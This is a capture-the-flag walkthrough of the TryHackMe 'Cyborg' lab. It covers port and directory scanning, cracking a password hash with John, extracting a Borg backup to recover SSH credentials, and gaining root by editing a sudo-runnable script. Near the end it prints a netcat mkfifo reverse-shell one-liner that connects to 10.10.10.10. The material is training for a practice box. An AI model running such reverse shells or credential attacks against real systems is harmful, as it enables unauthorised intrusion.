TryHackMe <br>
Cyborg
---

The nmap scan shows 2 ports open, SSH and an Apache web server. <br>
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/be6269fc-1484-46ec-ad10-2bff201b7d2b)

Gobuster revealed some directories of interest. <br>
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/77fd301e-416c-44ee-8634-88ba518e19cf)

I checked out the first one, */admin*, and poked around for some low hanging fruit and ran some more scans on those directories. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/4d858d70-bcb3-4aeb-909c-5566f555afdb)

The first wordlist I used didn’t find anything, so I tried a different wordlist and got a return of */squid*. <br>
After that I ran another one and found another directory! <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/3d3d84a1-de4d-4519-81e0-a6de89af56a0)

Back on the */admin* page there were a few things I found; there was an archive I could download and a chat from some of the users. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1d096604-ec73-4a26-82ef-faca13f08134)

Squid is mentioned, which is very interesting since I found a */passwd* directory from the scan earlier. <br>
Before I investigated that, I wanted to look at the archive file I downloaded. <br>
```
strings archive.tar
```
That returned some good info for me. <br>
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d223d5f0-0bc3-4387-a066-4e1cccf427f6)

I’ll save that in a file for later use, if need be. <br>
On to the */squid* directory <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/83555497-3da5-474d-af49-576880581918)

<b>passwd</b> showed this: <br>
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/60071c34-78b2-4e7c-bdf7-75686853e2b1)

<b>squid.conf</b> showed this: <br>
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/96b649dc-4c6c-47da-abac-262b74eb5c71)

I ran the <b>passwd</b> file I saved through John and got a password from the hash. <br>
```
sudo john passwd --wordlist=/usr/share/wordlists/rockyou.txt
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/137bcda2-8c76-4723-bd1a-b0d957618c0b)

After opening up the archive and digging around one of the files mentioned it being a *Borg backup* <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b1ee79d3-240d-4c09-b184-751535e2d98f)

I installed `Borg` and read up on how to extract files. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/3fb93d29-2bb9-44f7-9e39-1d440d4d3044)

Back in the */home* directory of the extracted archive, a new folder named <b>Alex</b> showed up with a text file inside. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0f82a403-0483-4130-9553-dbf8d95f6679)

*NOTE: (Alex was one of the people in the chat on the webpage)* <br> <br>
Time to see if I can SSH with those credentials! <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b9fa3e1e-c23b-4b0f-819d-72907d4b1f6b)

Since Alex can run that as root, I’ll look at that in a minute after I grab the first flag. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/3b614823-660e-4fdc-9890-a15a22e9f2f9)

Looking into the directory where the file Alex can run as root is at, it didn’t show we had write permissions. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c829a9fb-124f-4031-b719-0920c58e4879)

I was wanting to put a reverse shell code in there so I had to change the permissions. <br>
```
chmod +w backup.sh
```
After that was done, I put in my reverse shell code: <br>
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 >/tmp/f
```
Fired it off and I was in! <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/434734d8-f19f-4436-b6e8-1e9debfb9d0a)

Pwned this box!

















